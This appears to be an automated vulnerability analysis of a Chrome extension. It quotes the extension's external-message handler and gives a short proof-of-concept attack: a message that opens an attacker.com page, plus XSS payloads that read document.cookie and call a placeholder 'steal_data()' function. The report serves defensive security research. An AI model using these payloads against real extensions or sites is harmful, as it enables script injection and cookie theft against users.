# CoCo Analysis: gjpfmomcmpbkjfnmlbebcpbonahbdclh

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both chrome_tabs_executeScript_sink)

---

## Sink: bg_external_port_onMessage → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/gjpfmomcmpbkjfnmlbebcpbonahbdclh/opgen_generated_files/bg.js
Line 965: Minified bundle containing the vulnerable code
Line 54: `o.id` (tab ID passed to executeScript)

**Code:**

```javascript
// Background script - External connection handler
chrome.runtime.onConnectExternal.addListener(e => {
    p = e.sender.tab;
    let t = null;

    e.onMessage.addListener(o => {
        // "open url" command - creates tab and executes scripts
        if ("open url" === o.text) {
            chrome.tabs.create({url: o.openUrl, active: !1}, o => { // ← attacker-controlled URL
                chrome.tabs.executeScript(o.id, {file: "js/vendor/jquery.min.js"}, function() {
                    chrome.tabs.executeScript(o.id, {file: "js/paperFreeListen.js"}, function() { // ← executes script
                        chrome.tabs.insertCSS(o.id, {file: "css/paperFreeBox.css"}, function() {
                            t = o.id;
                            i[t] = e;
                            e.postMessage({createdTab: o});
                        });
                    });
                });
            });
        }

        // Other message handlers for tab operations
        if ("close tab" === o.text) chrome.tabs.remove(t, e => {});
        if ("focus tab" === o.text) chrome.tabs.update(t, {selected: !0}, e => {});
        if ("add info" === o.text) chrome.tabs.sendMessage(t, {text: "add info", title: o.title, description: o.description}, e => {}); // ← attacker-controlled data
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messaging via chrome.runtime.onConnectExternal

**Attack:**

```javascript
// From paperfree.com domain (allowed by externally_connectable)
var port = chrome.runtime.connect("extension-id");

// Trigger executeScript by opening arbitrary URL
port.postMessage({
    text: "open url",
    openUrl: "https://attacker.com/malicious-page"
});

// Inject malicious content via "add info"
port.postMessage({
    text: "add info",
    title: "<img src=x onerror=alert(document.cookie)>",
    description: "<script>steal_data()</script>"
});
```

**Impact:** External websites matching the externally_connectable patterns (*.paperfree.com, localhost) can create tabs at arbitrary URLs and execute extension scripts in those tabs. Additionally, attackers can inject arbitrary content into content scripts via the "add info" message handler, potentially leading to XSS in the extension's context. While the primary domains appear legitimate, if any of these domains are compromised or if there are subdomain takeover vulnerabilities, attackers gain code execution capabilities.
